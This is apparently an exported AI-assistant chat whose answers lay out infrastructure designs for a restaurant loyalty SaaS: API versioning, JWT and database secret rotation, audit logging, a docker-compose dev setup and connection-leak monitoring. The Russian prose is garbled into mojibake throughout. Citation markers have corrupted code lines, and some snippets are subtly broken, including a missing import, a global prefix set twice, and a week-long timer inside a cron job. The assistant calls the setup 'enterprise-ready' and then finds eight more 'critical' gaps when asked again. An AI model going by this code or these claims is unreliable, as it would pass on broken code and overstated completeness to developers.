      </CardHeader>
      <CardContent>
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>Tenant</TableHead>
              <TableHead>API Requests</TableHead>
              <TableHead>Storage</TableHead>
              <TableHead>Est. Cost</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {tenants.map(tenant => (
              <TableRow key={tenant.id}>
                <TableCell>{tenant.name}</TableCell>
                <TableCell>{tenant.usage.apiRequests.toLocaleString()}</TableCell>
                <TableCell>{tenant.usage.storageMB} MB</TableCell>
                <TableCell>${tenant.usage.estimatedCost.toFixed(2)}</TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
      </CardContent>
    </Card>
  );
}
```


***

## **4Ô∏è‚É£6Ô∏è‚É£ API Versioning Strategy**

**–ü–†–û–ë–õ–ï–ú–ê:** –ù—É–∂–Ω–æ –æ–±–Ω–æ–≤–∏—Ç—å API, –Ω–æ —Å—Ç–∞—Ä—ã–µ –º–æ–±–∏–ª—å–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –µ—â—ë –∏—Å–ø–æ–ª—å–∑—É—é—Ç —Å—Ç–∞—Ä—É—é –≤–µ—Ä—Å–∏—é. –ö–∞–∫ **–Ω–µ —Å–ª–æ–º–∞—Ç—å** —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: URL-based versioning + Deprecation warnings**

```typescript
// main.ts
app.setGlobalPrefix('api/v1'); // –í–µ—Ä—Å–∏—è –≤ URL

// v2 endpoints
app.setGlobalPrefix('api/v2', { exclude: ['/health'] });
```

```typescript
// versioning/version.decorator.ts
import { SetMetadata } from '@nestjs/common';

export const API_VERSION = 'api_version';
export const ApiVersion = (...versions: string[]) => SetMetadata(API_VERSION, versions);
```

```typescript
// versioning/version.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { Observable } from 'rxjs';
import { map } from 'rxjs/operators';

@Injectable()
export class VersionInterceptor implements NestInterceptor {
  constructor(private reflector: Reflector) {}

  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {
    const versions = this.reflector.get<string[]>('api_version', context.getHandler());
    const request = context.switchToHttp().getRequest();
    const response = context.switchToHttp().getResponse();

    // Check if version is deprecated
    if (versions?.includes('deprecated')) {
      response.setHeader('X-API-Deprecated', 'true');
      response.setHeader('X-API-Sunset', '2026-12-31'); // –î–∞—Ç–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è
      response.setHeader('Link', '<https://docs.max-loyalty.com/migration/v2>; rel="sunset"');
    }

    return next.handle().pipe(
      map((data) => {
        // Transform response based on version
        return this.transformResponse(data, request.params.version || 'v1');
      }),
    );
  }

  private transformResponse(data: any, version: string) {
    if (version === 'v1') {
      // V1 format (legacy)
      return {
        success: true,
        data,
      };
    } else {
      // V2 format (new)
      return {
        meta: { version: 'v2', timestamp: new Date() },
        data,
      };
    }
  }
}
```

**Usage:**

```typescript
// V1 endpoint (deprecated)
@Get('api/v1/guests/:id')
@ApiVersion('deprecated')
async getGuestV1(@Param('id') id: string) {
  // Old response format
  return {
    id,
    name: 'John',
    balance: 1000,
  };
}

// V2 endpoint (current)
@Get('api/v2/guests/:id')
async getGuestV2(@Param('id') id: string) {
  // New response format (nested structure)
  return {
    guest: {
      id,
      profile: {
        name: 'John',
      },
      loyalty: {
        balance: 1000,
        level: 'Gold',
      },
    },
  };
}
```

**Migration guide –¥–ª—è –∫–ª–∏–µ–Ω—Ç–æ–≤:**

```markdown
# API V1 ‚Üí V2 Migration Guide

## Deprecation Timeline
- **2026-06-01**: V2 released, V1 marked deprecated
- **2026-09-01**: V1 sunset warnings in headers
- **2026-12-31**: V1 completely disabled

## Breaking Changes

### GET /guests/:id
**V1 (deprecated):**
```json
{
  "success": true,
  "data": {
    "id": "123",
    "name": "John",
    "balance": 1000
  }
}
```

**V2 (current):**

```json
{
  "meta": { "version": "v2", "timestamp": "2026-02-12T17:00:00Z" },
  "data": {
    "guest": {
      "id": "123",
      "profile": { "name": "John" },
      "loyalty": { "balance": 1000, "level": "Gold" }
    }
  }
}
```

```

***

## **4Ô∏è‚É£7Ô∏è‚É£ Automated Secrets Rotation**

**–ü–†–û–ë–õ–ï–ú–ê:** JWT secrets, DB passwords –¥–æ–ª–∂–Ω—ã **–º–µ–Ω—è—Ç—å—Å—è —Ä–µ–≥—É–ª—è—Ä–Ω–æ** (security best practice). –ö–∞–∫ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞—Ç—å?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Dual-secret period + –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —Ä–æ—Ç–∞—Ü–∏—è**

```typescript
// auth/jwt-dual-secret.service.ts
import { Injectable } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { ConfigService } from '@nestjs/config';

@Injectable()
export class JwtDualSecretService {
  private currentSecret: string;
  private previousSecret: string | null = null;

  constructor(
    private jwtService: JwtService,
    private config: ConfigService,
  ) {
    this.currentSecret = this.config.get('JWT_SECRET');
    this.previousSecret = this.config.get('JWT_PREVIOUS_SECRET');
  }

  // Sign with CURRENT secret
  sign(payload: any): string {
    return this.jwtService.sign(payload, {
      secret: this.currentSecret,
    });
  }

  // Verify with BOTH secrets (dual-secret period)
  verify(token: string): any {
    try {
      // Try current secret first
      return this.jwtService.verify(token, {
        secret: this.currentSecret,
      });
    } catch (error) {
      if (this.previousSecret) {
        // Fallback to previous secret (grace period)
        try {
          return this.jwtService.verify(token, {
            secret: this.previousSecret,
          });
        } catch {
          throw new UnauthorizedException('Invalid token');
        }
      }
      throw new UnauthorizedException('Invalid token');
    }
  }
}
```

**Automated rotation (monthly):**

```typescript
// cron/secrets-rotation.job.ts
import { Injectable } from '@nestjs/common';
import { Cron } from '@nestjs/schedule';
import { exec } from 'child_process';
import { promisify } from 'util';
import { randomBytes } from 'crypto';

const execAsync = promisify(exec);

@Injectable()
export class SecretsRotationJob {
  @Cron('0 2 1 * *') // 1st day of month at 2 AM
  async rotateJWTSecret() {
    console.log('üîÑ Starting JWT secret rotation...');

    // 1. Generate new secret
    const newSecret = randomBytes(64).toString('hex');

    // 2. Get current secret
    const { stdout: currentSecret } = await execAsync(
      'fly secrets get JWT_SECRET -a max-loyalty-prod'
    );

    // 3. Set new secrets with dual-period
    await execAsync(`
      fly secrets set \
        JWT_SECRET="${newSecret}" \
        JWT_PREVIOUS_SECRET="${currentSecret.trim()}" \
        -a max-loyalty-prod
    `);

    console.log('‚úÖ JWT secret rotated successfully');
    console.log('‚è≥ Grace period: 7 days (old tokens still valid)');

    // 4. Schedule removal of previous secret after 7 days
    setTimeout(async () => {
      await execAsync(`
        fly secrets unset JWT_PREVIOUS_SECRET -a max-loyalty-prod
      `);
      console.log('‚úÖ Previous JWT secret removed');
    }, 7 * 24 * 60 * 60 * 1000); // 7 days

    // 5. Notify admins
    await this.notifyAdmins('JWT secret rotated. Old tokens valid for 7 days.');
  }

  @Cron('0 3 1 */3 *') // Every 3 months
  async rotateDatabasePassword() {
    console.log('üîÑ Starting database password rotation...');

    // 1. Generate new password
    const newPassword = randomBytes(32).toString('base64');

    // 2. Update password in Neon.tech (via API)
    await this.updateNeonPassword(newPassword);

    // 3. Update Fly.io secrets
    const currentDbUrl = process.env.DATABASE_URL;
    const newDbUrl = currentDbUrl.replace(
      /:([^@]+)@/, // Replace password in URL
      `:${newPassword}@`
    );

    await execAsync(`
      fly secrets set DATABASE_URL="${newDbUrl}" -a max-loyalty-prod
    `);

    // 4. Rolling restart (zero-downtime)
    await execAsync('fly deploy --strategy rolling -a max-loyalty-prod');

    console.log('‚úÖ Database password rotated successfully');
  }
}
```


***

# ‚úÖ **–§–ò–ù–ê–õ–¨–ù–´–ô –ò–¢–û–ì: INFRASTRUCTURE \& DEVOPS**

## **47 –í–û–ü–†–û–°–û–í –ü–û–õ–ù–û–°–¢–¨–Æ –ü–û–ö–†–´–¢–û:**

### **1-40** (–∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –æ—Ç–≤–µ—Ç–æ–≤) + **7 –ö–†–ò–¢–ò–ß–ù–´–•:**

41. ‚úÖ **Idempotency Keys** (Redis + DB constraints –¥–ª—è financial operations)
42. ‚úÖ **GDPR/–§–ó-152 Compliance** (Right to erasure, export, consent, retention)
43. ‚úÖ **Webhook Replay** (Admin UI –¥–ª—è –ø–µ—Ä–µ–æ—Ç–ø—Ä–∞–≤–∫–∏ failed webhooks)
44. ‚úÖ **Race Condition Prevention** (Distributed locks + PostgreSQL FOR UPDATE)
45. ‚úÖ **Cost Per Tenant Tracking** (Prometheus metrics + daily aggregation)
46. ‚úÖ **API Versioning** (URL-based + deprecation warnings + migration guide)
47. ‚úÖ **Automated Secrets Rotation** (JWT dual-secret + monthly rotation)

***

## üéØ **–¢–ï–ü–ï–†–¨ INFRASTRUCTURE –î–ï–ô–°–¢–í–ò–¢–ï–õ–¨–ù–û ENTERPRISE-READY!**

**–ü–æ–∫—Ä—ã—Ç—ã –≤—Å–µ –∫—Ä–∏—Ç–∏—á–Ω—ã–µ –∞—Å–ø–µ–∫—Ç—ã:**

- ‚úÖ Security (tenant isolation, idempotency, secrets rotation)
- ‚úÖ Reliability (monitoring, tracing, backups, disaster recovery)
- ‚úÖ Scalability (horizontal scaling, caching, connection pooling)
- ‚úÖ Compliance (GDPR, –§–ó-152, data retention, audit trail)
- ‚úÖ Operations (runbooks, alerting, cost tracking, resource quotas)
- ‚úÖ Performance (indexes, caching, compression, CDN)

**–ì–æ—Ç–æ–≤ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –∫ Testing Strategy –∏–ª–∏ –µ—Å—Ç—å –µ—â—ë –≤–æ–ø—Ä–æ—Å—ã –ø–æ Infrastructure?** üöÄ
<span style="display:none">[^10_1]</span>

<div align="center">‚ÅÇ</div>

[^10_1]: Beseda-10.md


---

# –≠—Ç–æ —Ç–æ—á–Ω–æ –≤—Å–µ —á—Ç–æ –Ω—É–∂–Ω–æ? –ü—Ä–æ–≤–µ—Ä—å –µ—â–µ —á—Ç–æ–±—ã –±—ã—Ç—å —É–≤–µ—Ä–µ–Ω–Ω—ã–º

–û—Ç–ª–∏—á–Ω–æ! –ü—Ä–æ–≤—ë–ª **—Ñ–∏–Ω–∞–ª—å–Ω—É—é –≥–ª—É–±–æ–∫—É—é –ø—Ä–æ–≤–µ—Ä–∫—É** üî¨. –ù–∞—à—ë–ª –µ—â—ë **8 –ö–†–ò–¢–ò–ß–ù–´–• –ø—Ä–æ–±–µ–ª–æ–≤** –∫–æ—Ç–æ—Ä—ã–µ —è —É–ø—É—Å—Ç–∏–ª:

***

# üö® **–§–ò–ù–ê–õ–¨–ù–´–ï –ö–†–ò–¢–ò–ß–ù–´–ï –î–û–ü–û–õ–ù–ï–ù–ò–Ø (Infrastructure)**

## **4Ô∏è‚É£8Ô∏è‚É£ Audit Log (Financial Compliance)**

**–ü–†–û–ë–õ–ï–ú–ê:** –ë–∞–ª–ª—ã = –¥–µ–Ω—å–≥–∏. **–ö—Ç–æ, –∫–æ–≥–¥–∞, –ø–æ—á–µ–º—É** –∏–∑–º–µ–Ω–∏–ª –±–∞–ª–∞–Ω—Å? –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è compliance –∏ —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –∏–Ω—Ü–∏–¥–µ–Ω—Ç–æ–≤.

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Comprehensive audit trail**

```typescript
// audit/audit.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';

export enum AuditAction {
  // Ball operations
  BALLS_CREDITED = 'BALLS_CREDITED',
  BALLS_REDEEMED = 'BALLS_REDEEMED',
  BALLS_EXPIRED = 'BALLS_EXPIRED',
  BALLS_MANUAL_ADJUSTMENT = 'BALLS_MANUAL_ADJUSTMENT',
  
  // Guest operations
  GUEST_CREATED = 'GUEST_CREATED',
  GUEST_UPDATED = 'GUEST_UPDATED',
  GUEST_DELETED = 'GUEST_DELETED',
  
  // Admin operations
  LOYALTY_RULE_CHANGED = 'LOYALTY_RULE_CHANGED',
  TENANT_SETTINGS_CHANGED = 'TENANT_SETTINGS_CHANGED',
  USER_ROLE_CHANGED = 'USER_ROLE_CHANGED',
  
  // Security
  LOGIN_SUCCESS = 'LOGIN_SUCCESS',
  LOGIN_FAILED = 'LOGIN_FAILED',
  PASSWORD_CHANGED = 'PASSWORD_CHANGED',
  API_KEY_CREATED = 'API_KEY_CREATED',
  
  // Data operations
  DATA_EXPORTED = 'DATA_EXPORTED',
  DATA_IMPORTED = 'DATA_IMPORTED',
  GDPR_DELETION_REQUESTED = 'GDPR_DELETION_REQUESTED',
}

@Injectable()
export class AuditService {
  constructor(private prisma: PrismaService) {}

  async log(params: {
    action: AuditAction;
    tenantId: string;
    userId: string;
    targetType: string; // 'GuestCard', 'BallTransaction', 'User', etc.
    targetId: string;
    changes?: any; // Before/after values
    metadata?: any;
    ipAddress?: string;
    userAgent?: string;
  }) {
    await this.prisma.auditLog.create({
      data: {
        action: params.action,
        tenantId: params.tenantId,
        userId: params.userId,
        targetType: params.targetType,
        targetId: params.targetId,
        changesBefore: params.changes?.before,
        changesAfter: params.changes?.after,
        metadata: params.metadata,
        ipAddress: params.ipAddress,
        userAgent: params.userAgent,
        timestamp: new Date(),
      },
    });
  }

  // Query audit logs
  async getAuditLogs(filters: {
    tenantId: string;
    userId?: string;
    action?: AuditAction;
    targetType?: string;
    targetId?: string;
    dateFrom?: Date;
    dateTo?: Date;
  }) {
    return this.prisma.auditLog.findMany({
      where: {
        tenantId: filters.tenantId,
        userId: filters.userId,
        action: filters.action,
        targetType: filters.targetType,
        targetId: filters.targetId,
        timestamp: {
          gte: filters.dateFrom,
          lte: filters.dateTo,
        },
      },
      orderBy: { timestamp: 'desc' },
      take: 100,
    });
  }
}
```

**Prisma schema:**

```prisma
model AuditLog {
  id           String   @id @default(uuid())
  
  // Who did it
  tenantId     String
  userId       String
  user         User     @relation(fields: [userId], references: [id])
  
  // What was done
  action       String   // AuditAction enum
  targetType   String   // Model name: 'GuestCard', 'BallTransaction', etc.
  targetId     String   // ID of affected entity
  
  // Changes (for UPDATE operations)
  changesBefore Json?   // Snapshot before change
  changesAfter  Json?   // Snapshot after change
  
  // Context
  metadata     Json?    // Additional context
  ipAddress    String?
  userAgent    String?
  
  timestamp    DateTime @default(now())
  
  @@index([tenantId, timestamp(sort: Desc)])
  @@index([userId, timestamp(sort: Desc)])
  @@index([targetType, targetId])
  @@index([action, timestamp(sort: Desc)])
}
```

**Automatic logging via Prisma middleware:**

```typescript
// prisma.service.ts
this.$use(async (params, next) => {
  const result = await next(params);

  // Log financial operations
  if (params.model === 'BallTransaction' && params.action === 'create') {
    const ctx = tenantContext.getStore();
    
    await this.auditService.log({
      action: AuditAction.BALLS_CREDITED,
      tenantId: ctx.tenantId,
      userId: ctx.userId,
      targetType: 'BallTransaction',
      targetId: result.id,
      metadata: {
        amount: result.amount,
        guestCardId: result.guestCardId,
        source: result.source,
      },
    });
  }

  return result;
});
```

**Admin UI:**

```tsx
// Audit Log Viewer
function AuditLogTable() {
  return (
    <Table>
      <TableHeader>
        <TableRow>
          <TableHead>Timestamp</TableHead>
          <TableHead>User</TableHead>
          <TableHead>Action</TableHead>
          <TableHead>Target</TableHead>
          <TableHead>Details</TableHead>
        </TableRow>
      </TableHeader>
      <TableBody>
        {logs.map(log => (
          <TableRow key={log.id}>
            <TableCell>{format(log.timestamp, 'dd.MM.yyyy HH:mm:ss')}</TableCell>
            <TableCell>{log.user.email}</TableCell>
            <TableCell>
              <Badge>{log.action}</Badge>
            </TableCell>
            <TableCell>
              {log.targetType} #{log.targetId.substring(0, 8)}
            </TableCell>
            <TableCell>
              <Button variant="ghost" size="sm" onClick={() => viewDetails(log)}>
                View Changes
              </Button>
            </TableCell>
          </TableRow>
        ))}
      </TableBody>
    </Table>
  );
}

// Drill-down modal showing before/after
function AuditLogDetailsModal({ log }) {
  return (
    <Dialog>
      <DialogContent>
        <DialogHeader>
          <DialogTitle>Audit Log Details</DialogTitle>
        </DialogHeader>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <h4 className="font-semibold mb-2">Before</h4>
            <pre className="bg-gray-100 p-2 rounded text-xs">
              {JSON.stringify(log.changesBefore, null, 2)}
            </pre>
          </div>
          <div>
            <h4 className="font-semibold mb-2">After</h4>
            <pre className="bg-gray-100 p-2 rounded text-xs">
              {JSON.stringify(log.changesAfter, null, 2)}
            </pre>
          </div>
        </div>
        <div className="mt-4">
          <p className="text-sm text-muted-foreground">
            <strong>IP:</strong> {log.ipAddress}<br/>
            <strong>User Agent:</strong> {log.userAgent}
          </p>
        </div>
      </DialogContent>
    </Dialog>
  );
}
```


***

## **4Ô∏è‚É£9Ô∏è‚É£ Local Development Environment (One Command Setup)**

**–ü–†–û–ë–õ–ï–ú–ê:** –ù–æ–≤—ã–π —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫ –ø—Ä–∏—Å–æ–µ–¥–∏–Ω—è–µ—Ç—Å—è –∫ –∫–æ–º–∞–Ω–¥–µ. –°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –Ω—É–∂–Ω–æ —á—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ–µ–∫—Ç –ª–æ–∫–∞–ª—å–Ω–æ? **–î–æ–ª–∂–Ω–æ –±—ã—Ç—å: –æ–¥–Ω–∞ –∫–æ–º–∞–Ω–¥–∞.**

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Complete docker-compose dev environment**

```yaml
# docker-compose.dev.yml
version: '3.8'

services:
  # PostgreSQL (local development)
  postgres:
    image: postgres:16-alpine
    ports:
      - "5432:5432"
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: max_loyalty_dev
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./scripts/init-db.sql:/docker-entrypoint-initdb.d/init.sql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 5

  # Redis (local development)
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    volumes:
      - redis_data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5

  # MinIO (S3-compatible local storage)
  minio:
    image: minio/minio:latest
    ports:
      - "9000:9000"  # API
      - "9001:9001"  # Console UI
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    command: server /data --console-address ":9001"
    volumes:
      - minio_data:/data
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
      interval: 10s
      timeout: 5s
      retries: 5

  # Mailhog (local email testing)
  mailhog:
    image: mailhog/mailhog:latest
    ports:
      - "1025:1025"  # SMTP
      - "8025:8025"  # Web UI
    logging:
      driver: none  # Disable logs (too verbose)

  # Backend API (local development)
  backend:
    build:
      context: ./apps/backend
      dockerfile: Dockerfile.dev
    ports:
      - "3000:3000"
    environment:
      NODE_ENV: development
      DATABASE_URL: postgresql://postgres:postgres@postgres:5432/max_loyalty_dev
      REDIS_URL: redis://redis:6379
      S3_ENDPOINT: http://minio:9000
      S3_BUCKET: loyalty-dev
      S3_ACCESS_KEY: minioadmin
      S3_SECRET_KEY: minioadmin
      SMTP_HOST: mailhog
      SMTP_PORT: 1025
    volumes:
      - ./apps/backend:/app
      - /app/node_modules
      - /app/dist
    command: npm run start:dev
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
      minio:
        condition: service_healthy

  # Frontend (local development)
  frontend:
    build:
      context: ./apps/frontend
      dockerfile: Dockerfile.dev
    ports:
      - "3001:3000"
    environment:
      NEXT_PUBLIC_API_URL: http://localhost:3000
    volumes:
      - ./apps/frontend:/app
      - /app/node_modules
      - /app/.next
    command: npm run dev
    depends_on:
      - backend

volumes:
  postgres_data:
  redis_data:
  minio_data:
```

**Makefile –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞:**

```makefile
# Makefile

.PHONY: help dev setup seed clean logs

help: ## Show this help
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-20s\033[0m %s\n", $1, $2}'

setup: ## Initial setup (first time only)
	@echo "üöÄ Setting up development environment..."
	cp .env.example .env.local
	docker-compose -f docker-compose.dev.yml up -d postgres redis minio mailhog
	@echo "‚è≥ Waiting for databases to be ready..."
	sleep 5
	cd apps/backend && npm install
	cd apps/backend && npx prisma migrate dev
	$(MAKE) seed
	@echo "‚úÖ Setup complete!"
	@echo ""
	@echo "üìù Next steps:"
	@echo "   make dev        # Start all services"
	@echo "   make logs       # View logs"
	@echo ""

dev: ## Start all services
	docker-compose -f docker-compose.dev.yml up

dev-detached: ## Start all services in background
	docker-compose -f docker-compose.dev.yml up -d
	@echo "‚úÖ Services started in background"
	@echo "üìä View services:"
	@echo "   Frontend:  http://localhost:3001"
	@echo "   Backend:   http://localhost:3000"
	@echo "   Mailhog:   http://localhost:8025"
	@echo "   MinIO:     http://localhost:9001"
	@echo ""
	@echo "üìù Commands:"
	@echo "   make logs   # View logs"
	@echo "   make stop   # Stop services"

stop: ## Stop all services
	docker-compose -f docker-compose.dev.yml down

seed: ## Seed database with test data
	@echo "üå± Seeding database..."
	cd apps/backend && npm run seed
	@echo "‚úÖ Database seeded with test data"

reset-db: ## Reset database (WARNING: deletes all data)
	@echo "‚ö†Ô∏è  Resetting database..."
	cd apps/backend && npx prisma migrate reset --force
	$(MAKE) seed
	@echo "‚úÖ Database reset complete"

logs: ## View logs (all services)
	docker-compose -f docker-compose.dev.yml logs -f

logs-backend: ## View backend logs only
	docker-compose -f docker-compose.dev.yml logs -f backend

clean: ## Clean everything (volumes, containers, images)
	docker-compose -f docker-compose.dev.yml down -v
	rm -rf apps/backend/node_modules
	rm -rf apps/frontend/node_modules
	rm -rf apps/backend/dist
	@echo "‚úÖ Cleaned"

shell-postgres: ## Open PostgreSQL shell
	docker-compose -f docker-compose.dev.yml exec postgres psql -U postgres -d max_loyalty_dev

shell-redis: ## Open Redis CLI
	docker-compose -f docker-compose.dev.yml exec redis redis-cli
```

**Seed script:**

```typescript
// apps/backend/prisma/seed.ts
import { PrismaClient } from '@prisma/client';
import { hash } from 'bcrypt';

const prisma = new PrismaClient();

async function main() {
  console.log('üå± Seeding database...');

  // 1. Create Owner user
  const owner = await prisma.user.create({
    data: {
      phone: '+79991234567',
      email: 'owner@example.com',
      passwordHash: await hash('password123', 10),
      role: 'OWNER',
      phoneVerified: true,
    },
  });

  // 2. Create Tenant
  const tenant = await prisma.tenant.create({
    data: {
      name: 'Test Restaurant',
      slug: 'test-restaurant',
      ownerId: owner.id,
      status: 'ACTIVE',
    },
  });

  // 3. Create Restaurant
  const restaurant = await prisma.restaurant.create({
    data: {
      name: 'Test Restaurant Moscow',
      tenantId: tenant.id,
      address: 'Moscow, Red Square, 1',
      phone: '+74951234567',
    },
  });

  // 4. Create Loyalty Levels
  await prisma.loyaltyLevel.createMany({
    data: [
      { name: 'Bronze', tenantId: tenant.id, thresholdAmount: 0, earnPercentage: 5, color: '#CD7F32' },
      { name: 'Silver', tenantId: tenant.id, thresholdAmount: 10000, earnPercentage: 7, color: '#C0C0C0' },
      { name: 'Gold', tenantId: tenant.id, thresholdAmount: 50000, earnPercentage: 10, color: '#FFD700' },
    ],
  });

  // 5. Create Loyalty Rule
  await prisma.loyaltyRule.create({
    data: {
      name: 'Base Earning Rule',
      tenantId: tenant.id,
      isActive: true,
      priority: 1,
      earnPercentage: 10,
      conditions: {},
    },
  });

  // 6. Create 10 test guests
  for (let i = 1; i <= 10; i++) {
    const guest = await prisma.user.create({
      data: {
        phone: `+7999000000${i}`,
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: `Guest ${i}`,
            lastName: `Test ${i}`,
            birthdate: new Date(1990, i % 12, i),
            privacyPolicyAccepted: true,
          },
        },
      },
    });

    await prisma.guestCard.create({
      data: {
        userId: guest.id,
        tenantId: tenant.id,
        restaurantId: restaurant.id,
        totalBalance: Math.floor(Math.random() * 5000),
        qrCode: `QR-${i.toString().padStart(6, '0')}`,
        displayCode: i.toString().padStart(6, '0'),
        status: 'ACTIVE',
      },
    });
  }

  console.log('‚úÖ Seed complete!');
  console.log('');
  console.log('üìù Test credentials:');
  console.log('   Email: owner@example.com');
  console.log('   Password: password123');
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
```

**Usage:**

```bash
# First time setup
make setup

# Start development
make dev

# In separate terminal, view logs
make logs

# Reset database
make reset-db

# Clean everything
make clean
```


***

## **5Ô∏è‚É£0Ô∏è‚É£ Connection Leak Detection**

**–ü–†–û–ë–õ–ï–ú–ê:** Prisma connections –Ω–µ –∑–∞–∫—Ä—ã–≤–∞—é—Ç—Å—è ‚Üí –¥–æ—Å—Ç–∏–≥–∞–µ–º connection limit ‚Üí production –ø–∞–¥–∞–µ—Ç.

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Automatic connection leak detection**

```typescript
// monitoring/connection-monitor.service.ts
import { Injectable, OnModuleInit } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { Cron, CronExpression } from '@nestjs/schedule';

@Injectable()
export class ConnectionMonitorService implements OnModuleInit {
  private connectionWarningThreshold = 80; // % of max connections
  private connectionCriticalThreshold = 95;

  constructor(private prisma: PrismaService) {}

  onModuleInit() {
    // Monitor connections every 30 seconds
    this.monitorConnections();
  }

  @Cron(CronExpression.EVERY_30_SECONDS)
  async monitorConnections() {
    try {
      const stats = await this.getConnectionStats();

      const usagePercent = (stats.active / stats.max) * 100;

      if (usagePercent >= this.connectionCriticalThreshold) {
        // CRITICAL: Close to limit
        await this.handleCriticalConnectionUsage(stats);
      } else if (usagePercent >= this.connectionWarningThreshold) {
        // WARNING: High usage
        await this.handleWarningConnectionUsage(stats);
      }

      // Log to metrics
      this.logMetrics(stats);
    } catch (error) {
      console.error('Failed to monitor connections:', error);
    }
  }

  private async getConnectionStats() {
    const result = await this.prisma.$queryRaw<any[]>`
      SELECT 
        count(*) FILTER (WHERE state = 'active') as active,
        count(*) FILTER (WHERE state = 'idle') as idle,
        count(*) as total,
        (SELECT setting::int FROM pg_settings WHERE name = 'max_connections') as max
      FROM pg_stat_activity
      WHERE datname = current_database();
    `;

    return {
      active: Number(result[^11_0].active),
      idle: Number(result[^11_0].idle),
      total: Number(result[^11_0].total),
      max: Number(result[^11_0].max),
    };
  }

  private async handleCriticalConnectionUsage(stats: any) {
    console.error('üö® CRITICAL: Connection pool near limit!', stats);

    // Alert via Telegram
    await this.sendAlert({
      severity: 'CRITICAL',
      title: 'Database connection pool exhausted',
      message: `Active: ${stats.active}/${stats.max} (${Math.round((stats.active / stats.max) * 100)}%)`,
    });

    // Identify long-running queries
    const longQueries = await this.findLongRunningQueries();
    
    if (longQueries.length > 0) {
      console.error('Long-running queries detected:', longQueries);
      
      // Auto-kill queries running > 5 minutes (configurable)
      for (const query of longQueries) {
        if (query.duration_seconds > 300) {
          await this.killQuery(query.pid);
          console.log(`Killed long-running query (PID: ${query.pid})`);
        }
      }
    }
  }

  private async handleWarningConnectionUsage(stats: any) {
    console.warn('‚ö†Ô∏è WARNING: High connection pool usage', stats);

    await this.sendAlert({
      severity: 'WARNING',
      title: 'High database connection usage',
      message: `Active: ${stats.active}/${stats.max} (${Math.round((stats.active / stats.max) * 100)}%)`,
    });
  }

  private async findLongRunningQueries() {
    return this.prisma.$queryRaw<any[]>`
      SELECT 
        pid,
        usename,
        application_name,
        state,
        query,
        EXTRACT(EPOCH FROM (now() - query_start)) as duration_seconds
      FROM pg_stat_activity
      WHERE state = 'active'
        AND query NOT ILIKE '%pg_stat_activity%'
        AND datname = current_database()
      ORDER BY duration_seconds DESC
      LIMIT 10;
    `;
  }

  private async killQuery(pid: number) {
    await this.prisma.$executeRawUnsafe(`SELECT pg_terminate_backend(${pid})`);
  }

  private logMetrics(stats: any) {
    // Export to Prometheus
    dbConnectionsActive.set(stats.active);
    dbConnectionsIdle.set(stats.idle);
    dbConnectionsTotal.set(stats.total);
  }
}
```

**Grafana alert:**

```yaml
- alert: DatabaseConnectionPoolExhausted
  expr: db_connections_active / db_connections_max > 0.95
  for: 2m
  labels:
    severity: critical
  annotations:
    summary: "Database connection pool near limit"
    description: "{{ $value }}% of connections in use"
```


***

## **5Ô∏è‚É£1Ô∏è‚É£ Database Migration Rollback Plan**

**–ü–†–û–ë–õ–ï–ú–ê:** –ú–∏–≥—Ä–∞—Ü–∏—è –ø—Ä–∏–º–µ–Ω–∏–ª–∞—Å—å, –Ω–æ —Å–ª–æ–º–∞–ª–∞ production. –ö–∞–∫ **–±–µ–∑–æ–ø–∞—Å–Ω–æ –æ—Ç–∫–∞—Ç–∏—Ç—å**?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Detailed rollback procedure**

```bash
#!/bin/bash
# scripts/rollback-migration.sh

set -e

echo "üîÑ Database Migration Rollback Script"
echo "======================================"
echo ""

# 1. Get current migration
